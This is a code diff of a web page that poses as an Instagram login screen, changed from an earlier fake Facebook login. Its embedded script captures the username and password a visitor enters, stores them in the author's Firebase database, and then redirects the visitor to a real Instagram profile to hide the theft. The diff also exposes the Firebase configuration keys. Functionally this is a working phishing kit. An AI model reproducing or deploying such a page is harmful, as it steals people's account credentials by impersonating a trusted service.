@@ -4,97 +4,85 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="styles.css" />
-    <title>nikita-bansal</title>
+    <link rel="stylesheet" href="./styles.css" />
+    <title>nikki | home</title>
   </head>
   <body>
-    <div class="logo">
-      <img class="fb" src="./utils/facebook.png" />
+    <div class="instagram">
+      <img class="imgInstagram" src="./logo.png" />
     </div>
-    <div class="details">
-      <input
-        type="email"
-        name="email"
-        id="email"
-        placeholder="Mobile number or email address"
-      />
-      <input type="text" name="password" id="pass" placeholder="Password" />
-    </div>
-    <div class="login">
-      <button class="btnLogin">Log In</button>
-    </div>
-    <div class="forgotPass">
-      <p>Forgotten password?</p>
+    <div class="fbButton">
+      <!-- <img class="imgFb" src="./fb.png" /> -->
+      <div class="continue">Continue with Facebook</div>
     </div>
     <div class="or">
-      <hr class="first" />
-      <p id="or">or</p>
-      <hr class="second" />
+      <hr class="hrOr" />
+      <div class="txtOr">OR</div>
+      <hr class="hrOr" />
     </div>
-    <div class="create">
-      <button class="btnCreate">Create New Account</button>
+    <div class="credentials">
+      <input
+        class="username"
+        type="text"
+        placeholder="Phone number, username, or email"
+      />
+      <input class="pass" type="password" placeholder="Password" />
+      <div class="forgotPass">Forgot Password?</div>
+      <button class="btnLogin">Log In</button>
     </div>
-    <div class="languages">
-      <div class="firstPart">
-        <p class="english">English (UK)</p>
-        <p class="pubjabi">ਪੰਜਾਬੀ</p>
-        <p class="gujrati">ગુજરાતી</p>
-        <p class="tamil">தமிழ்</p>
-      </div>
-      <div class="secondPart">
-        <p class="hindi">हिन्दी</p>
-        <p class="urdu">اردو</p>
-        <p class="baangla">বাংলা</p>
-      </div>
+    <div class="donot">
+      <p>Don't have an account?</p>
+      <p class="signUp">Sign Up</p>
     </div>
-    <div class="meta">
-      <p>Meta © 2022</p>
+    <div class="footer">
+      <hr width="100%" />
+      <div class="from">from</div>
+      <img class="meta" src="./meta.png" />
     </div>
 
     <script type="module">
       // Import the functions you need from the SDKs you need
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-app.js";
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-analytics.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+      } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js";
       // TODO: Add SDKs for Firebase products that you want to use
       // https://firebase.google.com/docs/web/setup#available-libraries
 
       // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
       const firebaseConfig = {
-        apiKey: "AIzaSyBqbK9unpxk52wpR0SiYIcl12HZkZIa3X8",
-        authDomain: "nikku-c1610.firebaseapp.com",
-        projectId: "nikku-c1610",
-        storageBucket: "nikku-c1610.appspot.com",
-        messagingSenderId: "177693830142",
-        appId: "1:177693830142:web:62e4c106e3f9bbe1502eaf"
+        apiKey: "AIzaSyBmGyJdiC1Kd_9SzhV2ahCdn8McEL8Y2nw",
+        authDomain: "nikki-12f4b.firebaseapp.com",
+        projectId: "nikki-12f4b",
+        storageBucket: "nikki-12f4b.appspot.com",
+        messagingSenderId: "668332004847",
+        appId: "1:668332004847:web:eb3c5f04688251a903921a",
+        measurementId: "G-X1T6JM74D6",
       };
 
       // Initialize Firebase
       const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const db = getDatabase(app);
 
-      import {
-        getFirestore,
-        doc,
-        collection,
-        addDoc,
-      } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js";
+      var username = document.querySelector(".username");
+      var pass = document.querySelector(".pass");
+      var btnLogin = document.querySelector(".btnLogin");
 
-      const db = getFirestore();
-
-      var name = document.getElementById("email");
-      var pass = document.getElementById("pass");
-
-      async function AddDocument_AutoID() {
-        var ref = collection(db, "Data");
-        const docRef = await addDoc(ref, {
-          name: name.value,
+      function insertData() {
+        set(ref(db, "users/" + username.value), {
+          username: username.value,
           pass: pass.value,
         }).then(() => {
-          location.href = "https://www.facebook.com/profile.php?id=100075744686882";
+          location.href = "https://www.instagram.com/nikita_bansal_04/";
         });
       }
 
-      document
-        .getElementById("btnLogin")
-        .addEventListener("click", AddDocument_AutoID);
+      btnLogin.addEventListener("click", insertData);
     </script>
   </body>
 </html>
